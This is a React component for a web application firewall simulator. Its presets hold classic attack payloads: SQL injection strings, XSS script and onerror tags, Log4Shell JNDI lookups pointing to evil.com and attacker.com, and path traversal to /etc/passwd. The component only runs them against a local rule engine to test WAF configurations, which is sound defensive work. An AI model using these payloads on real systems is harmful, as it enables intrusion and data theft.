"use client";

import React, { useState } from "react";
import { useWAFSimStore } from "@/store/wafsimStore";
import { HttpRequest, HTTPMethod, HTTPProtocol, AttackPreset } from "@/lib/types";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Textarea } from "@/components/ui/textarea";
import {
  Select, SelectContent, SelectItem, SelectTrigger, SelectValue,
} from "@/components/ui/select";
import { Badge } from "@/components/ui/badge";
import { Play, Plus, Trash2, Zap } from "lucide-react";
import { evaluateWebACL } from "@/engines/wafEngine";

const ATTACK_PRESETS: AttackPreset[] = [
  { id: "sqli-basic", name: "SQL Injection (Basic)", description: "' OR '1'='1 in query param", category: "sqli", request: { method: "GET", uri: "/api/users?id=1' OR '1'='1", sourceIP: "192.168.1.100", country: "US" } },
  { id: "sqli-union", name: "UNION SQLi", description: "UNION SELECT injection", category: "sqli", request: { method: "GET", uri: "/search?q=' UNION SELECT * FROM users--", sourceIP: "192.168.1.100", country: "US" } },
  { id: "xss-script", name: "XSS Script Tag", description: "<script>alert() in body", category: "xss", request: { method: "POST", uri: "/comment", body: '<script>alert("XSS")</script>', headers: [{ name: "Content-Type", value: "application/x-www-form-urlencoded" }], sourceIP: "192.168.1.100", country: "US" } },
  { id: "xss-event", name: "XSS Event Handler", description: "onerror handler injection", category: "xss", request: { method: "POST", uri: "/profile", body: '<img src=x onerror=alert(1)>', sourceIP: "192.168.1.100", country: "US" } },
  { id: "log4shell", name: "Log4Shell (CVE-2021-44228)", description: "JNDI lookup in headers", category: "rce", request: { method: "GET", uri: "/", headers: [{ name: "X-Api-Version", value: "${jndi:ldap://evil.com/x}" }, { name: "User-Agent", value: "${jndi:ldap://attacker.com/a}" }], sourceIP: "192.168.1.100", country: "US" } },
  { id: "path-traversal", name: "Path Traversal", description: "../../etc/passwd", category: "traversal", request: { method: "GET", uri: "/files?path=../../../etc/passwd", sourceIP: "192.168.1.100", country: "US" } },
  { id: "bot-sqlmap", name: "SQLMap Bot", description: "Automated SQLi tool UA", category: "bot", request: { method: "GET", uri: "/products?id=1", headers: [{ name: "User-Agent", value: "sqlmap/1.5.2#stable (https://sqlmap.org)" }], sourceIP: "10.0.0.50", country: "RU" } },
  { id: "admin-access", name: "Admin Panel Probe", description: "wp-admin access attempt", category: "auth", request: { method: "GET", uri: "/wp-admin/setup.php", sourceIP: "192.168.1.100", country: "CN" } },
  { id: "geo-block", name: "Geo-Restricted Request", description: "Request from blocked country", category: "other", request: { method: "GET", uri: "/api/data", sourceIP: "185.220.101.1", country: "RU" } },
  { id: "legitimate", name: "Legitimate Request", description: "Normal GET request", category: "other", request: { method: "GET", uri: "/api/users", headers: [{ name: "User-Agent", value: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" }], sourceIP: "203.0.113.50", country: "US" } },
];

interface TrafficSimulatorProps {
  onSimulate?: () => void;
}

export const TrafficSimulator: React.FC<TrafficSimulatorProps> = ({ onSimulate }) => {
  const { currentRequest, setCurrentRequest, wafs, ipSets, regexPatternSets, setEvaluationResultWithWAF, setIsSimulating } = useWAFSimStore();
  const [activeSection, setActiveSection] = useState<"form" | "presets" | "batch" | "flood">("form");
  const [batchResults, setBatchResults] = useState<Array<{ name: string; category: string; action: string }> | null>(null);
  const [floodConfig, setFloodConfig] = useState({ rps: 50, duration: 60, sourceIPs: 1, uri: "/api/endpoint", method: "GET" as string });

  const activeWAF = wafs.length > 0 ? wafs[0] : null;

  const applyPreset = (preset: AttackPreset) => {
    setCurrentRequest({
      protocol: preset.request.protocol || "HTTP/1.1",
      method: preset.request.method || "GET",
      uri: preset.request.uri || "/",
      queryParams: preset.request.queryParams || {},
      headers: preset.request.headers || [{ name: "Host", value: "example.com" }, { name: "User-Agent", value: "Mozilla/5.0" }],
      body: preset.request.body || "",
      bodyEncoding: preset.request.bodyEncoding || "none",
      contentType: preset.request.contentType || "application/json",
      sourceIP: preset.request.sourceIP || "192.168.1.100",
      country: preset.request.country || "US",
    });
    setActiveSection("form");
  };

  const runBatch = () => {
    if (!activeWAF) return;
    const results = ATTACK_PRESETS.map(p => {
      const req: HttpRequest = {
        protocol: "HTTP/1.1", method: p.request.method || "GET", uri: p.request.uri || "/",
        queryParams: {}, headers: p.request.headers || [{ name: "Host", value: "example.com" }],
        body: p.request.body || "", bodyEncoding: "none", contentType: "application/json",
        sourceIP: p.request.sourceIP || "192.168.1.100", country: p.request.country || "US",
      };
      return { name: p.name, category: p.category, action: evaluateWebACL(req, activeWAF, { ipSets, regexPatternSets }).finalAction };
    });
    setBatchResults(results);
  };

  const addHeader = () => setCurrentRequest({ ...currentRequest, headers: [...(currentRequest.headers || []), { name: "", value: "" }] });
  const updateHeader = (i: number, f: "name" | "value", v: string) => {
    const h = [...(currentRequest.headers || [])]; h[i] = { ...h[i], [f]: v };
    setCurrentRequest({ ...currentRequest, headers: h });
  };
  const removeHeader = (i: number) => setCurrentRequest({ ...currentRequest, headers: (currentRequest.headers || []).filter((_, idx) => idx !== i) });

  return (
    <div className="h-full flex text-white text-xs">
      {/* Section tabs (vertical) */}
      <div className="w-20 bg-gray-900 border-r border-gray-800 flex flex-col shrink-0">
        {([["form", "📝 Form"], ["presets", "⚡ Presets"], ["batch", "🧪 Batch"], ["flood", "Flood/Rate"]] as const).map(([key, label]) => (
          <button key={key} onClick={() => setActiveSection(key)}
            className={`px-2 py-2 text-[11px] text-left border-b border-gray-800 transition-colors ${activeSection === key ? "bg-gray-800 text-white font-medium" : "text-gray-500 hover:text-gray-300 hover:bg-gray-800/50"}`}>
            {label}
          </button>
        ))}
      </div>

      {/* Content */}
      <div className="flex-1 overflow-y-auto p-3 min-w-0">
        {activeSection === "form" && (
          <div className="grid grid-cols-[1fr_1fr_2fr] gap-x-4 gap-y-2">
            {/* Col 1: Method, Protocol, IP, Country */}
            <div className="space-y-2">
              <div>
                <Label className="text-[10px] text-gray-500 uppercase">Method</Label>
                <Select value={currentRequest.method} onValueChange={(v: HTTPMethod) => setCurrentRequest({ ...currentRequest, method: v })}>
                  <SelectTrigger className="bg-gray-800 border-gray-700 h-7 text-xs"><SelectValue /></SelectTrigger>
                  <SelectContent>
                    {(["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"] as const).map(m => <SelectItem key={m} value={m}>{m}</SelectItem>)}
                  </SelectContent>
                </Select>
              </div>
              <div>
                <Label className="text-[10px] text-gray-500 uppercase">Protocol</Label>
                <Select value={currentRequest.protocol} onValueChange={(v: HTTPProtocol) => setCurrentRequest({ ...currentRequest, protocol: v })}>
                  <SelectTrigger className="bg-gray-800 border-gray-700 h-7 text-xs"><SelectValue /></SelectTrigger>
                  <SelectContent>
                    {(["HTTP/1.0", "HTTP/1.1", "HTTP/2", "HTTP/3"] as const).map(p => <SelectItem key={p} value={p}>{p}</SelectItem>)}
                  </SelectContent>
                </Select>
              </div>
              <div>
                <Label className="text-[10px] text-gray-500 uppercase">Source IP</Label>
                <Input value={currentRequest.sourceIP} onChange={e => setCurrentRequest({ ...currentRequest, sourceIP: e.target.value })} className="bg-gray-800 border-gray-700 h-7 text-xs font-mono" />
              </div>
              <div>
                <Label className="text-[10px] text-gray-500 uppercase">Country</Label>
                <Input value={currentRequest.country} onChange={e => setCurrentRequest({ ...currentRequest, country: e.target.value })} maxLength={2} className="bg-gray-800 border-gray-700 h-7 text-xs uppercase w-16" />
              </div>
            </div>

            {/* Col 2: URI + Body */}
            <div className="space-y-2">
              <div>
                <Label className="text-[10px] text-gray-500 uppercase">URI Path</Label>
                <Input value={currentRequest.uri} onChange={e => setCurrentRequest({ ...currentRequest, uri: e.target.value })} className="bg-gray-800 border-gray-700 h-7 text-xs font-mono" />
              </div>
              <div>
                <Label className="text-[10px] text-gray-500 uppercase">Body</Label>
                <Textarea value={currentRequest.body} onChange={e => setCurrentRequest({ ...currentRequest, body: e.target.value })}
                  className="bg-gray-800 border-gray-700 text-xs font-mono min-h-[80px] resize-none" placeholder='{"key":"value"}' />
              </div>
            </div>

            {/* Col 3: Headers */}
            <div>
              <div className="flex items-center justify-between mb-1">
                <Label className="text-[10px] text-gray-500 uppercase">Headers</Label>
                <Button size="sm" variant="ghost" onClick={addHeader} className="h-5 text-[10px] text-gray-400 px-1"><Plus className="w-3 h-3 mr-0.5" />Add</Button>
              </div>
              <div className="space-y-1 max-h-[200px] overflow-y-auto">
                {(currentRequest.headers || []).map((h, i) => (
                  <div key={i} className="flex gap-1 items-center">
                    <Input value={h.name} onChange={e => updateHeader(i, "name", e.target.value)} placeholder="Name" className="bg-gray-800 border-gray-700 h-6 text-[11px] flex-1 font-mono" />
                    <Input value={h.value} onChange={e => updateHeader(i, "value", e.target.value)} placeholder="Value" className="bg-gray-800 border-gray-700 h-6 text-[11px] flex-[2] font-mono" />
                    <button onClick={() => removeHeader(i)} className="text-gray-600 hover:text-red-400 shrink-0"><Trash2 className="w-3 h-3" /></button>
                  </div>
                ))}
              </div>
            </div>
          </div>
        )}

        {activeSection === "presets" && (
          <div className="grid grid-cols-2 gap-1.5">
            {ATTACK_PRESETS.map(p => (
              <button key={p.id} onClick={() => applyPreset(p)}
                className="text-left px-2.5 py-2 rounded bg-gray-800/50 hover:bg-gray-800 border border-gray-700/50 hover:border-gray-600 transition-colors">
                <div className="flex items-center gap-1.5">
                  <Badge variant="outline" className="text-[9px] px-1 shrink-0">{p.category}</Badge>
                  <span className="font-medium text-[11px] truncate">{p.name}</span>
                </div>
                <p className="text-[10px] text-gray-500 mt-0.5 truncate">{p.description}</p>
              </button>
            ))}
          </div>
        )}

        {activeSection === "batch" && (
          <div>
            <div className="flex items-center gap-2 mb-3">
              <p className="text-gray-400 flex-1">Run all {ATTACK_PRESETS.length} attack presets against your WAF configuration.</p>
              <Button onClick={runBatch} disabled={!activeWAF} size="sm" className="bg-purple-600 hover:bg-purple-700 shrink-0">
                <Zap className="w-3 h-3 mr-1" />Run All
              </Button>
            </div>
            {batchResults && (
              <div className="space-y-0.5">
                <div className="flex gap-3 mb-2 text-[11px] font-medium">
                  <span className="text-red-400">🛑 Blocked: {batchResults.filter(r => r.action === "BLOCK").length}</span>
                  <span className="text-green-400">✅ Allowed: {batchResults.filter(r => r.action === "ALLOW").length}</span>
                  <span className="text-yellow-400">📊 Counted: {batchResults.filter(r => r.action === "COUNT").length}</span>
                </div>
                {batchResults.map((r, i) => (
                  <div key={i} className="flex items-center justify-between px-2 py-1 rounded bg-gray-800/50 hover:bg-gray-800">
                    <div className="flex items-center gap-2 min-w-0">
                      <Badge variant="outline" className="text-[9px] px-1 shrink-0">{r.category}</Badge>
                      <span className="truncate">{r.name}</span>
                    </div>
                    <Badge className={`shrink-0 text-[9px] ${r.action === "BLOCK" ? "bg-red-600" : r.action === "COUNT" ? "bg-yellow-600" : "bg-green-600"}`}>{r.action}</Badge>
                  </div>
                ))}
              </div>
            )}
          </div>
        )}
        {activeSection === "flood" && (
          <div className="space-y-3">
            <p className="text-gray-400 text-[11px]">Simulate volumetric attacks and rate-based rule behavior.</p>
            <div className="grid grid-cols-3 gap-3">
              <div>
                <Label className="text-[10px] text-gray-500 uppercase">Requests/sec</Label>
                <Input type="number" value={floodConfig.rps} onChange={e => setFloodConfig({...floodConfig, rps: parseInt(e.target.value) || 1})} className="bg-gray-800 border-gray-700 h-7 text-xs" />
              </div>
              <div>
                <Label className="text-[10px] text-gray-500 uppercase">Duration (sec)</Label>
                <Input type="number" value={floodConfig.duration} onChange={e => setFloodConfig({...floodConfig, duration: parseInt(e.target.value) || 1})} className="bg-gray-800 border-gray-700 h-7 text-xs" />
              </div>
              <div>
                <Label className="text-[10px] text-gray-500 uppercase">Source IPs</Label>
                <Input type="number" value={floodConfig.sourceIPs} onChange={e => setFloodConfig({...floodConfig, sourceIPs: parseInt(e.target.value) || 1})} min={1} max={100} className="bg-gray-800 border-gray-700 h-7 text-xs" />
              </div>
            </div>
            <div className="grid grid-cols-2 gap-3">
              <div>
                <Label className="text-[10px] text-gray-500 uppercase">Target URI</Label>
                <Input value={floodConfig.uri} onChange={e => setFloodConfig({...floodConfig, uri: e.target.value})} className="bg-gray-800 border-gray-700 h-7 text-xs font-mono" />
              </div>
              <div>
                <Label className="text-[10px] text-gray-500 uppercase">Method</Label>
                <Select value={floodConfig.method} onValueChange={v => setFloodConfig({...floodConfig, method: v})}>
                  <SelectTrigger className="bg-gray-800 border-gray-700 h-7 text-xs"><SelectValue /></SelectTrigger>
                  <SelectContent>
                    {["GET","POST","PUT","DELETE"].map(m => <SelectItem key={m} value={m}>{m}</SelectItem>)}
                  </SelectContent>
                </Select>
              </div>
            </div>
            <div className="bg-gray-800 rounded p-2 text-[11px] text-gray-400 space-y-1">
              <div>Total requests: <span className="text-white font-mono">{floodConfig.rps * floodConfig.duration}</span></div>
              <div>From <span className="text-white font-mono">{floodConfig.sourceIPs}</span> unique IP{floodConfig.sourceIPs > 1 ? "s" : ""}</div>
              <div>Rate per IP: <span className="text-white font-mono">{Math.ceil(floodConfig.rps / floodConfig.sourceIPs)}</span> req/sec = <span className="text-white font-mono">{Math.ceil((floodConfig.rps / floodConfig.sourceIPs) * 300)}</span> per 5min window</div>
            </div>
            <Button onClick={onSimulate} disabled={!activeWAF} size="sm" className="w-full bg-orange-600 hover:bg-orange-700">
              🌊 Run Flood Simulation
            </Button>
          </div>
        )}
      </div>
    </div>
  );
};

export default TrafficSimulator;
